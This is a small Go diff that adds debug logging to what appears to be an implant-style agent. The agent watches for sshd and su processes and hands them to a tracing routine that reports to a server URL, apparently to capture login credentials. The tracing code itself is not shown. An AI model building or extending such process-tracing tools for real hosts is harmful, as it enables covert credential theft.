@@ -5,6 +5,7 @@ package agent_helper
 import (
 	"context"
 	"fmt"
+	"galleon/debug"
 	"os"
 	"regexp"
 	"strconv"
@@ -128,6 +129,9 @@ func runSSHMonitor(ctx context.Context, serverUrl string, taskData map[string]in
 
 			if isSSHPid(pid) {
 				processedPids = append(processedPids, pid)
+				if debug.Debug {
+					fmt.Printf("[*] Found ssh pid: %v\n", pid)
+				}
 				if !skippedFirstSSH {
 					skippedFirstSSH = true
 					continue
@@ -135,6 +139,9 @@ func runSSHMonitor(ctx context.Context, serverUrl string, taskData map[string]in
 				go traceSSHDProcess(ctx, serverUrl, taskData, pid)
 			} else if isSUPid(pid) {
 				processedPids = append(processedPids, pid)
+				if debug.Debug {
+					fmt.Printf("[*] Found su pid: %v\n", pid)
+				}
 				if !skippedFirstSU {
 					skippedFirstSU = true
 					continue
